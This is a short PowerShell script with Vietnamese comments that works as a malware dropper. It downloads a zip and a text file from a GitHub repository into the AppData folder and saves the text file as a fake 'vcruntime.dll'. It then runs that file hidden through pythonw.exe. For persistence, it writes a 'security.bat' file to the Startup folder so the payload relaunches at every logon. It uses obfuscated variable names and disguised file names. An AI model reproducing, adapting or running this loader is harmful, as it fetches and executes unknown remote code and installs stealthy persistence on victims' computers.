$ltrmn = 'https://github.com/PXTDEV9022/test1/raw/refs/heads/main/system1.zip'
$rawdll = 'https://raw.githubusercontent.com/PXTDEV9022/test1/refs/heads/main/system.txt'
$kdsf = "$env:APPDATA\pzk.zip"
$cwab = "$env:APPDATA\Extrac"
$dll = "$env:APPDATA\Extrac\vcruntime.dll"

$gqjd = Join-Path $cwab 'python.exe'

if (!(Test-Path $cwab)) { New-Item -Path $cwab -ItemType Directory }

Invoke-WebRequest -Uri $ltrmn -OutFile $kdsf

tar -xf $kdsf -C $cwab
Invoke-WebRequest -Uri $rawdll -OutFile $dll
Remove-Item $kdsf -Force
Start-Process -FilePath pythonw.exe -ArgumentList 'vcruntime.dll' -WorkingDirectory $cwab



# Đường dẫn đến thư mục Startup
$startupFolder = [Environment]::GetFolderPath('Startup')

# Tên file batch cần tạo
$batchFileName = "security.bat"

# Đường dẫn đầy đủ của file batch trong thư mục Startup
$batchFilePath = Join-Path $startupFolder $batchFileName

# Nội dung của file batch (đã thay đổi theo yêu cầu)
$batchContent = @"
cd "%APPDATA%\Extrac"
start "" pythonw.exe vcruntime.dll
"@

# Tạo file batch
Set-Content -Path $batchFilePath -Value $batchContent

Write-Host "File batch đã được tạo trong thư mục Startup: $batchFilePath"